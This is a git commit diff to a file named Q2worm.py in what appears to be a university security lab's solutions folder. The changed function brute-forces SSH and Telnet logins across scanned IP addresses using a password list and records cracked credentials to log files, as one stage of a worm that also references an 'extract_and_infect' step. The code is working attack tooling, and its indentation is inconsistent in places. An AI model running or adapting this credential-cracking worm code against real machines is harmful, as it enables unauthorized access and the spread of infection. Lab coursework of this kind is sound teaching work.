78fed251d170fdb60f3789d5f577bc7bbdef9966
Christopher Rauch <153033298+3cr3@users.noreply.github.com>
2025-02-25 23:01:26 -0500

    Update find_vulnerable_accounts

--- lab2/Solutions/Q2worm.py
+++ lab2/Solutions/Q2worm.py
@@ -15,30 +15,49 @@ def find_vulnerable_machines(ip_bytes):
     # Runs try_ports.sh
     subprocess.run(["bash", "./try_ports.sh", ip_bytes])
 
-def find_vulnerable_accounts(ssh_log, telnet_log):
+def find_vulnerable_users():
     '''
-    Input: 
-    ssh_log, telnet_log.
-
     Output:
-    None.
-    Creates files ssh_accounts.log, telnet_accounts.log;
-    Store user data in format ip,user,passwd.
+    ssh_accounts.log
+    telnet_accounts.log
+    - File in ip,user,passwd format of cracked users.
+
     '''
+    sys.tracebacklimit=0
     client = paramiko.client.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     with open("/home/cse/Lab2/Q2pwd") as file:
         user_combos = file.readlines()
-    user_combos = [u.split(" ") for u in user_combos]
+    user_combos = [u.strip().split(" ")for u in user_combos]
 
     with open("open_ssh.log") as file:
         ssh_log = file.readlines()
+    ssh_log = [ip.strip() for ip in ssh_log]
+    with open("open_telnet.log") as file:
+        telnet_log = file.readlines()
+    telnet_log = [ip.strip() for ip in telnet_log]
     for ip in ssh_log:
-        for user, password in user_combos:
-            client.connect(ip, username=user, password=password)
-            _stdin, _stdout,_stderr = client.exec_command("df")
-            print(_stdout.read().decode())
-            client.close()
+          for user, password in user_combos:
+              while True:
+                  try:
+                      client.connect(ip, username=user, password=password, timeout=200)
+                      with open("ssh_accounts.log", "a") as file:
+                          file.write(f"{ip},{user},{password}\n")
+                          break
+                  except paramiko.ssh_exception.AuthenticationException:
+                      break
+                  except paramiko.ssh_exception.SSHException:
+                      pass
+      for ip in telnet_log:
+          for user, password in user_combos:
+              tn = telnetlib.Telnet(ip)
+              tn.read_until(b"login: ")
+              tn.write(user.encode('ascii') + b"\n")
+              tn.read_until(b"Password: ")
+              tn.write(password.encode('ascii') + b"\n")
+              if tn.read_until(b"Welcome", timeout=1) == b"\r\nWelcome":
+                  with open("telnet_accounts.log", "a") as file:
+                          file.write(f"{ip},{user},{password}\n")
 
 def extract_and_infect():
     '''
